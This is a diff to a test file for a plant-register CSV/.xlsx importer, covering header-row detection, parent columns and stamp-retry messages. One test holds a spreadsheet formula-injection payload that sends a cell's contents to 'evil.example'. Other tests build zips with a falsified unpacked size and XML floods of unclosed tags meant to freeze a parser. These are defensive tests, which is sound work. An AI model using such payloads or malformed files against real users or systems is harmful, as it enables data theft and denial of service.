@@ -5,7 +5,9 @@
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 import { strToU8, zipSync } from 'fflate';
 import {
+  KEY_STAMPS_PER_DAY,
   LIMITS,
+  MAX_COLUMNS,
   MAX_ROWS,
   MAX_SET,
   checkRows,
@@ -14,7 +16,9 @@ import {
   detectDateOrder,
   emptyMapping,
   guessMapping,
+  importedRecordIds,
   isDateFormat,
+  keyStampDays,
   loadLedger,
   normalizeDate,
   parseCsv,
@@ -28,8 +32,11 @@ import {
   sealRows,
   serialToIso,
   splitParents,
+  stampPauseWords,
   stampWait,
   toSheet,
+  tooManyRows,
+  withHeaderRow,
   type Committer,
   type Mapping,
   type Sheet,
@@ -615,16 +622,337 @@ describe('the key date stamp queue', () => {
       /may already have gone out \(transaction tx-9\)/,
     );
     const told = Object.assign(new Error('no'), { retryAfterSeconds: 120 });
-    expect(stampWait(told, now)).toEqual({ pauseUntil: now + 120_000 });
+    expect(stampWait(told, now)).toEqual({ pauseUntil: now + 120_000, why: 'other' });
     expect(stampWait(new Error('Your network has used this hour’s free transactions. Try later.'), now)).toEqual({
       pauseUntil: now + 3_600_000,
+      why: 'quota',
     });
     expect(stampWait(new Error('This browser has used today’s free anchor calls. Try tomorrow.'), now)).toEqual({
       pauseUntil: now + 6 * 3_600_000,
+      why: 'quota',
     });
     expect(stampWait(Object.assign(new Error('x'), { retryAfterSeconds: 1 }), now)).toEqual({
       pauseUntil: now + 60_000,
+      why: 'other',
     });
-    expect(stampWait('something else', now)).toEqual({ pauseUntil: now + 300_000 });
+    expect(stampWait('something else', now)).toEqual({ pauseUntil: now + 300_000, why: 'other' });
+  });
+});
+
+// ── Round 2: the column names' row, safe .xlsx reading, separators, both parents ────────
+
+/** The reviewer's file as Excel's "Save as CSV (UTF-8)" writes it: a title row, a blank row, then the column names. */
+const TITLED_CSV = [
+  '\uFEFFGreen Valley TC Lab — Accession Register (rev 7),,,,,,,,',
+  ',,,,,,,,',
+  'Acc. #,Cultivar / Line,Name (JP),Species,Parentage (Mother x Father),Source / Breeder,Date Initiated,Media,Notes',
+  'GV-2021-001,Blue Dream,,Cannabis sativa,,Tiny Farm,01/01/2021,MS 1/2,"from clone, ""keeper"" pheno"',
+  'GV-2022-002,Sour Diesel,,,Gelato 33 x Mimosa,"Okinawa Gen. 株式会社",2/2/2022,MS 1/2,',
+  'GV-2023-003,GG4,青い夢,C. sativa L.,Purple Punch × Apple Fritter,"Chunky Seeds, NJ",03.03.2023,MS 1/2,',
+  '',
+].join('\r\n');
+
+const HEADER_NAMES = [
+  'Acc. #',
+  'Cultivar / Line',
+  'Name (JP)',
+  'Species',
+  'Parentage (Mother x Father)',
+  'Source / Breeder',
+  'Date Initiated',
+  'Media',
+  'Notes',
+];
+
+/** The same register as Excel saves it: the title merged across A1:I1, a blank row 2, shared strings. */
+const titledXlsx = () => {
+  const strings = ['Green Valley TC Lab — Accession Register (rev 7)', ...HEADER_NAMES, 'GV-2021-001', 'Blue Dream'];
+  const si = strings.map((t) => `<si><t>${t.replace(/&/g, '&amp;')}</t></si>`).join('');
+  const cols = 'ABCDEFGHI';
+  const row3 = HEADER_NAMES.map((_, i) => `<c r="${cols[i]}3" t="s"><v>${i + 1}</v></c>`).join('');
+  const sheet =
+    '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><dimension ref="A1:I4"/><sheetData>' +
+    '<row r="1" spans="1:9" ht="18.75"><c r="A1" s="1" t="s"><v>0</v></c><c r="B1" s="1"/><c r="C1" s="1"/><c r="I1" s="1"/></row>' +
+    '<row r="2" spans="1:9"/>' +
+    `<row r="3" spans="1:9">${row3}</row>` +
+    '<row r="4" spans="1:9"><c r="A4" t="s"><v>10</v></c><c r="B4" t="s"><v>11</v></c><c r="G4" s="2"><v>44197</v></c></row>' +
+    '</sheetData><mergeCells count="1"><mergeCell ref="A1:I1"/></mergeCells></worksheet>';
+  return zipSync(
+    Object.fromEntries(
+      Object.entries({
+        'xl/workbook.xml':
+          '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="r"><sheets><sheet name="Register" sheetId="1" r:id="rId1"/></sheets></workbook>',
+        'xl/_rels/workbook.xml.rels':
+          '<Relationships><Relationship Id="rId1" Target="worksheets/sheet1.xml"/></Relationships>',
+        'xl/sharedStrings.xml': `<sst>${si}</sst>`,
+        'xl/styles.xml':
+          '<styleSheet><cellXfs count="3"><xf numFmtId="0"/><xf numFmtId="0"/><xf numFmtId="14"/></cellXfs></styleSheet>',
+        'xl/worksheets/sheet1.xml': sheet,
+      }).map(([k, v]) => [k, strToU8(v)]),
+    ),
+  );
+};
+
+describe('which row has the column names', () => {
+  it('"Save as CSV" with a title row and a blank row: the column names are row 3, and no title is sealed', async () => {
+    const s = await readSheet(fileOf(TITLED_CSV, 'accessions.csv'));
+    expect(s.headerLine).toBe(3);
+    expect(s.headers).toEqual(HEADER_NAMES);
+    expect(s.rows.map((r) => r.line)).toEqual([4, 5, 6]);
+    const m = guessMapping(s.headers);
+    expect(m.columns).toMatchObject({ refId: 0, strainName: 1, taxon: 3, parents: 4, parents2: null, bredBy: 5 });
+    const c = checkRows(s, m, { existing: [] });
+    expect(c.headerRows).toEqual([]);
+    expect(c.ready).toBe(3);
+    expect(c.rows.map((r) => r.fields.strainName)).toEqual(['Blue Dream', 'Sour Diesel', 'GG4']);
+    expect(c.rows[1].fields.parents).toEqual([{ name: 'Gelato 33' }, { name: 'Mimosa' }]);
+  });
+
+  it('an Excel file whose title is merged across the columns: the same', async () => {
+    const s = await readSheet(fileOf(titledXlsx(), 'accessions.xlsx'));
+    expect(s.kind).toBe('xlsx');
+    expect(s.headerLine).toBe(3);
+    expect(s.headers).toEqual(HEADER_NAMES);
+    expect(s.rows).toHaveLength(1);
+    expect(s.rows[0].cells.slice(0, 2)).toEqual(['GV-2021-001', 'Blue Dream']);
+    expect(s.rows[0].cells[6]).toBe('2021-01-01');
+    expect(s.raw.map((r) => r.line)).toEqual([1, 3, 4]); // what the "Which row" step offers
+  });
+
+  it('a row picked by hand; with the title taken as the column names, the real ones are refused, not sealed', async () => {
+    const s = await readSheet(fileOf(TITLED_CSV, 'accessions.csv'));
+    const wrong = withHeaderRow(s, 1);
+    expect(wrong.headerLine).toBe(1);
+    expect(wrong.rows.map((r) => r.line)).toEqual([3, 4, 5, 6]);
+    // Only the name column picked, by hand: the row of column names is still caught.
+    const m: Mapping = { ...emptyMapping(), columns: { ...emptyMapping().columns, strainName: 1 } };
+    const c = checkRows(wrong, m, { existing: [] });
+    expect(c.headerRows).toEqual([3]);
+    expect(c.rows[0]).toMatchObject({ line: 3, status: 'problem' });
+    expect(c.rows[0].problems[0]).toMatch(/looks like column names, not a plant/);
+    expect(c.ready).toBe(3);
+    // Back to the right row: nothing refused.
+    const right = withHeaderRow(wrong, 3);
+    expect(right.headers).toEqual(HEADER_NAMES);
+    expect(checkRows(right, guessMapping(right.headers), { existing: [] }).headerRows).toEqual([]);
+  });
+
+  it('the column names again further down (two exports pasted together) are refused too', () => {
+    const s = sheetOf('Name,ID,Notes\nA,1,\nName,ID,Notes\nB,2,\n');
+    const c = checkRows(s, mapAll(s), { existing: [] });
+    expect(c.headerRows).toEqual([3]);
+    expect(c.ready).toBe(2);
+  });
+
+  it('plants with ordinary names are never taken for column names', () => {
+    const s = sheetOf(
+      'Name,ID,Parents,Notes\nPlant 1,ID-1,Mother x Father,from clone\nMother Line,TC-2,,selection notes\n',
+    );
+    const c = checkRows(s, mapAll(s), { existing: [] });
+    expect(c.headerRows).toEqual([]);
+    expect(c.ready).toBe(2);
+  });
+
+  it('column names it doesn’t know: the first row about as wide as the table; one column: the first row', async () => {
+    const s = await readSheet(fileOf('Inventar 2024\nKultivar;Art;Herkunft;Datum\nA;B;C;D\n', 'x.csv'));
+    expect(s.headerLine).toBe(2);
+    expect(s.headers).toEqual(['Kultivar', 'Art', 'Herkunft', 'Datum']);
+    const one = await readSheet(fileOf('Plants\nA\nB\n', 'x.csv'));
+    expect(one.headerLine).toBe(1);
+    expect(one.rows).toHaveLength(2);
+  });
+});
+
+/** An .xlsx with this sheet XML (and an optional lie about the sheet's unpacked size). */
+const sheetXlsx = (sheet: string, statedSize?: number) => {
+  const z = zipSync(
+    {
+      'xl/workbook.xml': strToU8('<workbook><sheets><sheet name="a" r:id="rId1"/></sheets></workbook>'),
+      'xl/_rels/workbook.xml.rels': strToU8(
+        '<Relationships><Relationship Id="rId1" Target="worksheets/sheet1.xml"/></Relationships>',
+      ),
+      'xl/worksheets/sheet1.xml': strToU8(sheet),
+    },
+    { level: 9 },
+  );
+  if (statedSize !== undefined) {
+    // The size in the local header and in the central directory, as the reviewer's file did.
+    const dv = new DataView(z.buffer, z.byteOffset, z.byteLength);
+    const name = strToU8('xl/worksheets/sheet1.xml');
+    const named = (at: number, len: number) => len === name.length && name.every((b, j) => z[at + j] === b);
+    for (let i = 0; i < z.length - 4; i++) {
+      const sig = dv.getUint32(i, true);
+      if (sig === 0x04034b50 && named(i + 30, dv.getUint16(i + 26, true))) dv.setUint32(i + 22, statedSize, true);
+      if (sig === 0x02014b50 && named(i + 46, dv.getUint16(i + 28, true))) dv.setUint32(i + 24, statedSize, true);
+    }
+  }
+  return z;
+};
+
+const timed = <T>(f: () => T): [T | Error, number] => {
+  const t = performance.now();
+  try {
+    return [f(), performance.now() - t];
+  } catch (e) {
+    return [e as Error, performance.now() - t];
+  }
+};
+
+describe('reading an .xlsx safely', () => {
+  it('unclosed tags (the reviewer’s 1.4 KB file froze the tab) are read in one pass', () => {
+    // 40,000 unclosed rows took 5.6 s before (and grew with the square); 400,000 now take well under that.
+    const [, rowsMs] = timed(() =>
+      parseXlsx(sheetXlsx(`<worksheet><sheetData>${'<row r="1">'.repeat(400_000)}</sheetData></worksheet>`)),
+    );
+    expect(rowsMs).toBeLessThan(3000);
+    for (const inner of [
+      '<row r="1"><c r="A1">'.repeat(100_000),
+      `<row r="1"><c r="A1" t="inlineStr"><is>${'<t>'.repeat(200_000)}</is></c></row>`,
+      `<row r="1"><c r="A1"><v>1</v>${'<v>'.repeat(200_000)}</c></row>`,
+      `<row r="1" ${'a='.repeat(200_000)}><c r="A1"><v>1</v></c></row>`,
+      `<row r="1"><c r="A1" t="inlineStr"><is>${'<rPh>'.repeat(200_000)}<t>x</t></is></c></row>`,
+    ]) {
+      const [, ms] = timed(() => parseXlsx(sheetXlsx(`<worksheet><sheetData>${inner}</sheetData></worksheet>`)));
+      expect(ms).toBeLessThan(3000);
+    }
+  });
+
+  it('well-formed rows still read as before around a broken one', () => {
+    const rows = parseXlsx(
+      sheetXlsx(
+        '<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>' +
+          '<row r="2"><c r="A2" t="inlineStr"><is><t>Harbour Mist</t></is></c></row><row r="3"><c r="A3"></sheetData></worksheet>',
+      ),
+    );
+    expect(rows).toEqual([
+      { line: 1, cells: ['Name'] },
+      { line: 2, cells: ['Harbour Mist'] },
+    ]);
+  });
+
+  it('a sheet longer than the zip says is read only to the stated size, and that is said', async () => {
+    const body = Array.from(
+      { length: 2000 },
+      (_, i) => `<row r="${i + 2}"><c r="A${i + 2}" t="inlineStr"><is><t>Plant ${i}</t></is></c></row>`,
+    ).join('');
+    const xml = `<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>${body}</sheetData></worksheet>`;
+    const s = await readSheet(fileOf(sheetXlsx(xml, 1000), 'lies.xlsx'));
+    expect(s.warnings.join(' ')).toMatch(/damaged or cut short, so only the first part of the sheet was read/);
+    expect(s.rows.length).toBeGreaterThan(0);
+    expect(s.rows.length).toBeLessThan(20);
+    // An honest file says nothing of the kind.
+    expect((await readSheet(fileOf(sheetXlsx(xml), 'ok.xlsx'))).warnings).toEqual([]);
+    // A stated size over the cap is refused before anything is unpacked.
+    await expect(readSheet(fileOf(sheetXlsx(xml, 64 * 1024 * 1024), 'big.xlsx'))).rejects.toThrow(/too large/);
+  });
+
+  it('stops after the rows an import can take, and the file is named as too long, not counted wrong', async () => {
+    const body = Array.from(
+      { length: 900 },
+      (_, i) => `<row r="${i + 2}"><c r="A${i + 2}" t="inlineStr"><is><t>Plant ${i}</t></is></c></row>`,
+    ).join('');
+    const s = await readSheet(
+      fileOf(
+        sheetXlsx(
+          `<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>${body}</sheetData></worksheet>`,
+        ),
+        'long.xlsx',
+      ),
+    );
+    expect(s.moreRows).toBe(true);
+    expect(s.rows.length).toBeLessThan(MAX_ROWS + 20);
+    expect(tooManyRows(s)).toBe(
+      `This file has more than ${MAX_ROWS} rows. Import up to ${MAX_ROWS} at a time: split the file and import the rest after.`,
+    );
+    expect(checkRows(s, mapAll(s), { existing: [] }).blocked).toBe(tooManyRows(s));
+  });
+
+  it(`reads at most ${MAX_COLUMNS} columns, and says so`, async () => {
+    const wide = Array.from({ length: 150 }, (_, i) => `H${i}`);
+    const s = await readSheet(fileOf(`Name,${wide.join(',')}\nA,${wide.join(',')}\n`, 'wide.csv'));
+    expect(s.headers).toHaveLength(MAX_COLUMNS);
+    expect(s.rows[0].cells).toHaveLength(MAX_COLUMNS);
+    expect(s.warnings.join(' ')).toMatch(new RegExp(`Only the first ${MAX_COLUMNS} columns are read`));
+    // Picking another row doesn't say it twice.
+    expect(withHeaderRow(s, 1).warnings).toHaveLength(1);
+  });
+});
+
+describe('separators and parents, round 2', () => {
+  it('a "sep=" line names only a comma, semicolon, tab or bar; "sep==" is dropped, so no results line starts with "="', () => {
+    const p = parseCsv('sep==\nNotes=Name\n=HYPERLINK("https://evil.example/?"&B1;"Open")\n');
+    expect(p.delimiter).not.toBe('=');
+    expect(p.rows[0]).toEqual(['Notes=Name']);
+    const s = toSheet(
+      p.rows.map((cells, i) => ({ line: i + 2, cells })),
+      'csv',
+      p.delimiter,
+    );
+    const c = checkRows(
+      s,
+      { ...emptyMapping(), columns: { ...emptyMapping().columns, strainName: 0 } },
+      { existing: [] },
+    );
+    const out = resultsCsv(
+      { headers: s.headers, delimiter: s.delimiter, rows: c.rows, outcomes: {} },
+      'https://veilcore.org',
+    );
+    for (const line of out.replace(/^\uFEFF/, '').split('\r\n')) expect(line.startsWith('=')).toBe(false);
+    for (const [line, d] of [
+      ['sep=|\nName|ID\nA|1\n', '|'],
+      ['sep=\t\nName\tID\n', '\t'],
+      ['sep=;\nName;ID\n', ';'],
+      ['sep=,\nName,ID\n', ','],
+      ['sep="\nName,ID\n', ','],
+    ])
+      expect(parseCsv(line).delimiter).toBe(d);
+  });
+
+  it('a column naming both parents is the parents column; one naming the father alone is the second parent', () => {
+    expect(guessMapping(['Name', 'Parentage (Mother x Father)']).columns).toMatchObject({ parents: 1, parents2: null });
+    expect(guessMapping(['Name', 'Female x Male']).columns).toMatchObject({ parents: 1, parents2: null });
+    expect(guessMapping(['Name', 'Dam / Sire', 'Father']).columns).toMatchObject({ parents: 1, parents2: 2 });
+    expect(guessMapping(['Name', 'Mother', 'Father']).columns).toMatchObject({ parents: 1, parents2: 2 });
+  });
+});
+
+describe('key date stamps: the rate and the words', () => {
+  it('about 3 a day from one browser: 119 take about 40 days', () => {
+    expect(KEY_STAMPS_PER_DAY).toBe(3);
+    expect(keyStampDays(119)).toBe(40);
+    expect(keyStampDays(1)).toBe(1);
+  });
+
+  it('a fee service it couldn’t reach is said as that, not as "waiting for the fee service"', () => {
+    const now = 1_000_000;
+    const unreachable = Object.assign(new Error('The sponsor is not answering. Try again in a few minutes.'), {
+      code: 'unreachable',
+    });
+    expect(stampWait(unreachable, now).why).toBe('unreachable');
+    expect(stampWait(new TypeError('Failed to fetch'), now).why).toBe('offline');
+    expect(
+      stampWait(new Error('Could not reach the Midnight network or the sponsor. Nothing was sent. Try again.'), now)
+        .why,
+    ).toBe('offline');
+    expect(stampPauseWords('offline', '3 PM')).toBe(
+      "Couldn't reach the network or the fee service; trying again later. Next try: 3 PM.",
+    );
+    expect(stampWait(Object.assign(new Error('Too many'), { code: 'rate', status: 429 }), now).why).toBe('quota');
+    expect(stampPauseWords('unreachable', '3 PM')).toBe(
+      "Couldn't reach the fee service; trying again later. Next try: 3 PM.",
+    );
+    expect(stampPauseWords('quota', '3 PM')).toMatch(/^The free key stamps are used up for now/);
+    expect(stampPauseWords(undefined, '3 PM')).toMatch(/^A key stamp didn't go through/);
+  });
+
+  it('the records an import made are known after the job is gone (Home says their key stamps are queued)', async () => {
+    const s = sheetOf('Name\nA\nB\n');
+    await sealRows(checkRows(s, mapAll(s), { existing: [] }).rows, {
+      commit: (b) => Promise.resolve({ stored: b.map((r) => r.id), refused: [] }),
+      gapMs: 0,
+    });
+    const ids = importedRecordIds();
+    expect(ids).toHaveLength(2);
+    expect(ids.every((id) => /^VEIL-/.test(id))).toBe(true);
   });
 });
